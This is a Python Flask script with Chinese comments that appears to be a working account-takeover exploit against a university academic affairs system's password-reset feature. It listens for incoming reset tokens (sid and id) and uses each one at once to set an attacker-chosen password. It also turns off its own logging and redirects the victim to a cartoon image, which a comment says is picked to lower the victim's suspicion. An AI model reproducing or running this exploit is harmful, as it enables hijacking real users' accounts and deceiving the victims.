from flask import Flask,request,redirect
import requests
import _thread 

LPORT=1234 #本地端口
HOST="XXX.edu.cn" #教务系统地址
PROTOCOL="http" #教务系统是http还是https
PASSWORD="AAAbbb111!!!" #想把密码改成什么
proxies={"http":"http://127.0.0.1:8081"}
proxies=None #代理设置

def disablelogs():
    import logging
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)


def resetpassword(sid,id):
    print("[*]开始重置密码")
    url="{PROTOCOL}://{HOST}/forgetPassword/modifyPassword?sid={sid}&id={id}".format(PROTOCOL=PROTOCOL,HOST=HOST,sid=sid,id=id)
    #print(url)
    r=requests.get(url=url,proxies=proxies)
    page=r.text
    cookies=r.cookies
    try:
        tokenValue=page.split('tokenValue" value="')[1].split('"/>')[0]
    except Exception:
        print("[-]获取tokenValue失败")
        return 
    print("[+]获取到tokenValue:",tokenValue)

    url="{PROTOCOL}://{HOST}/forgetPassword/modifyResult".format(PROTOCOL=PROTOCOL,HOST=HOST)
    data={"tokenValue":tokenValue,"id":id,"sid":sid,"password":PASSWORD,"password1":PASSWORD}
    page=requests.post(url=url,data=data,proxies=proxies,cookies=cookies).text
    if "密码修改成功" in page:
        print("[+]密码重置成功")
    else:
        print("[-]出现错误，密码重置失败")



app = Flask(__name__)
@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def process(path):
    sid=str(request.args.get("sid"))
    id=str(request.args.get("id"))
    #如果当前的URL中获取不到sid或者id，或者获取到的有问题就返回错误
    if not (id and sid and "forgetPassword/modifyPassword" in path):
        return "invalid access"
    try:
        int(id)
        print("当前id",id)
    except Exception:
        return "invalid access"

    print("[+]获取到密码重置token sid="+sid," id="+id)
    #开一个线程去重置密码
    _thread.start_new_thread(resetpassword,(sid,id))
    #返回笔者精心挑选的罗小黑的图片，降低受害者警惕程度
    return  redirect("https://s2.ax1x.com/2020/01/08/l2QaSs.jpg")


if __name__ == '__main__':
    disablelogs()
    print("[*]开启服务中")
    app.run(port=LPORT)